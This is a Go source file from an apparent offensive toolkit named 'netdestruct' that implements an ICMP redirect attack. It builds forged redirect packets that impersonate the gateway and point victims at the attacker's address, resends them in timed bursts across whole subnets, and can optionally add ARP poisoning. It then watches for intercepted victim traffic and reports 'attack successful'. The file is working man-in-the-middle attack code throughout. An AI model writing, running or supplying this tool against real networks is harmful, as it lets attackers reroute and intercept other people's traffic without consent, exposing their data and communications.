package icmpredirect

import (
	"bufio"
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"

	"netdestruct/libs/dos/routing"
	"netdestruct/libs/mitm/arp"
)

const (
	icmpTag         = "\x1b[34m[ICMP]\x1b[0m"
	redirectTag     = "\x1b[34m[ICMP Redirect]\x1b[0m"
	receivedTag     = "\x1b[32m"
	unreachableTag  = "\x1b[38;5;208m[Destination Unreachable]\x1b[0m"
	redirectBurst   = 5
	redirectPeriod  = 10 * time.Second
	maxIPv4HostBits = 12
)

var embeddedDst = net.ParseIP("8.8.8.8").To4()

type rawSocket interface {
	Send(pkt []byte, dst net.IP) error
	Close() error
}

type captureSocket interface {
	Recv(buf []byte) (int, error)
	SetReadTimeout(d time.Duration) error
	Close() error
}

// Redirector sends forged ICMP redirects and optionally ARP-poisons targets.
type Redirector struct {
	Interface string
	Target    string
}

func (r *Redirector) Run() error {
	victims, err := expandVictimIPs(r.Target)
	if err != nil {
		return err
	}

	iface, err := net.InterfaceByName(r.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", r.Interface, err)
	}
	attacker, err := ifaceIPv4(iface)
	if err != nil {
		return err
	}

	fmt.Printf("%s Starting ICMP Redirect attack...\n", icmpTag)

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Activate ARP spoofing for the target(s)? [y/N]: ")
	arpLine, _ := reader.ReadString('\n')
	doARP := strings.EqualFold(strings.TrimSpace(arpLine), "y")

	fmt.Print("Default gateway IP: ")
	gwLine, _ := reader.ReadString('\n')
	gateway := net.ParseIP(strings.TrimSpace(gwLine))
	if gateway == nil {
		return fmt.Errorf("invalid gateway IP %q", strings.TrimSpace(gwLine))
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped.\n", icmpTag)
		cancel()
		os.Exit(0)
	}()

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		listenTargets(ctx, iface, victims)
	}()

	if doARP {
		wg.Add(1)
		go func() {
			defer wg.Done()
			p := &arp.LoopPoisoner{
				Interface: r.Interface,
				Targets:   victims,
				Gateway:   gateway,
			}
			if err := p.Run(ctx); err != nil && ctx.Err() == nil {
				fmt.Fprintf(os.Stderr, "%s %v\n", unreachableTag, err)
			}
		}()
	}

	ticker := time.NewTicker(redirectPeriod)
	defer ticker.Stop()

	sendAll := func() {
		for _, victim := range victims {
			v4 := victim.To4()
			if v4 == nil {
				fmt.Printf("%s Skipping %s (ICMP redirect requires IPv4 victim)\n", unreachableTag, victim)
				continue
			}
			gw4 := gateway.To4()
			if gw4 == nil {
				fmt.Printf("%s Gateway must be IPv4 for redirect to %s\n", unreachableTag, victim)
				continue
			}
			pkt := buildRedirectPacket(gw4, v4, attacker, buildOriginalDatagram(v4))
			var sendErr error
			for i := 0; i < redirectBurst; i++ {
				if err := sock.Send(pkt, v4); err != nil {
					sendErr = err
					break
				}
			}
			if sendErr != nil {
				fmt.Printf("%s Failed to reach %s: %v\n", unreachableTag, victim, sendErr)
				continue
			}
			fmt.Printf("%s Sent to %s → use %s as gateway\n", redirectTag, victim, attacker)
		}
	}

	sendAll()
	for {
		select {
		case <-ctx.Done():
			wg.Wait()
			return nil
		case <-ticker.C:
			sendAll()
		}
	}
}

func ifaceIPv4(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		if n, ok := a.(*net.IPNet); ok {
			if v4 := n.IP.To4(); v4 != nil {
				return v4, nil
			}
		}
	}
	return nil, fmt.Errorf("no IPv4 address on interface %s", iface.Name)
}

func expandVictimIPs(spec string) ([]net.IP, error) {
	routes, err := routing.ExpandTargets(spec)
	if err != nil {
		return nil, err
	}
	seen := make(map[string]bool)
	var out []net.IP
	for _, route := range routes {
		for _, ip := range hostsFromRoute(route) {
			key := ip.String()
			if !seen[key] {
				seen[key] = true
				out = append(out, ip)
			}
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no victim IPs resolved from %q", spec)
	}
	return out, nil
}

func hostsFromRoute(r routing.Route) []net.IP {
	if v4 := r.Addr.To4(); v4 != nil {
		if r.PrefixLen >= 32 {
			return []net.IP{v4}
		}
		return allIPv4Hosts(r)
	}
	if r.PrefixLen >= 128 {
		return []net.IP{r.Addr.To16()}
	}
	return nil
}

func allIPv4Hosts(r routing.Route) []net.IP {
	v4 := r.Addr.To4()
	if v4 == nil {
		return nil
	}
	ones := r.PrefixLen
	if ones <= 0 {
		ones = 32
	}
	hostBits := 32 - ones
	if hostBits > maxIPv4HostBits {
		hostBits = maxIPv4HostBits
	}
	network := routing.IPv4ToUint32(v4) & (^uint32(0) << uint(32-hostBits))
	count := uint32(1) << uint(hostBits)
	out := make([]net.IP, 0, count)
	for i := uint32(0); i < count; i++ {
		out = append(out, routing.Uint32ToIPv4(network+i))
	}
	return out
}

func buildOriginalDatagram(victim net.IP) []byte {
	ipLen := 40
	ip := make([]byte, 20)
	ip[0] = 0x45
	binary.BigEndian.PutUint16(ip[2:4], uint16(ipLen))
	ip[9] = 6
	copy(ip[12:16], victim.To4())
	copy(ip[16:20], embeddedDst)
	binary.BigEndian.PutUint16(ip[10:12], ipChecksum(ip))

	tcp := make([]byte, 20)
	binary.BigEndian.PutUint16(tcp[0:2], 12345)
	binary.BigEndian.PutUint16(tcp[2:4], 80)
	tcp[12] = 0x50
	tcp[13] = 0x02

	return append(ip, tcp...)
}

func buildRedirectPacket(gateway, victim, attacker net.IP, original []byte) []byte {
	icmpLen := 8 + len(original)
	ipLen := 20 + icmpLen
	pkt := make([]byte, ipLen)

	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:4], uint16(ipLen))
	pkt[8] = 64
	pkt[9] = 1
	copy(pkt[12:16], gateway.To4())
	copy(pkt[16:20], victim.To4())

	pkt[20] = 5
	pkt[21] = 1
	copy(pkt[24:28], attacker.To4())
	copy(pkt[28:], original)

	binary.BigEndian.PutUint16(pkt[22:24], icmpChecksum(pkt[20:]))
	binary.BigEndian.PutUint16(pkt[10:12], ipChecksum(pkt[:ipLen]))
	return pkt
}

func ipChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func icmpChecksum(data []byte) uint16 {
	return ipChecksum(data)
}

func listenTargets(ctx context.Context, iface *net.Interface, victims []net.IP) {
	capSock, err := openCaptureSocket(iface)
	if err != nil {
		fmt.Fprintf(os.Stderr, "%s capture: %v\n", icmpTag, err)
		return
	}
	defer capSock.Close()

	targets := make(map[string]bool, len(victims))
	for _, v := range victims {
		targets[v.String()] = true
	}

	buf := make([]byte, 65536)
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		_ = capSock.SetReadTimeout(500 * time.Millisecond)
		n, err := capSock.Recv(buf)
		if err != nil || n < 14 {
			continue
		}
		src := parseFrameSrcIP(buf[:n])
		if src == nil || !targets[src.String()] {
			continue
		}
		fmt.Printf("%s- recieved data from %s, attack successful\x1b[0m\n", receivedTag, src)
	}
}

func parseFrameSrcIP(frame []byte) net.IP {
	if len(frame) < 14 {
		return nil
	}
	switch binary.BigEndian.Uint16(frame[12:14]) {
	case 0x0800:
		if len(frame) < 34 {
			return nil
		}
		return net.IP(append([]byte{}, frame[26:30]...))
	case 0x86DD:
		if len(frame) < 54 {
			return nil
		}
		return net.IP(append([]byte{}, frame[22:38]...))
	default:
		return nil
	}
}
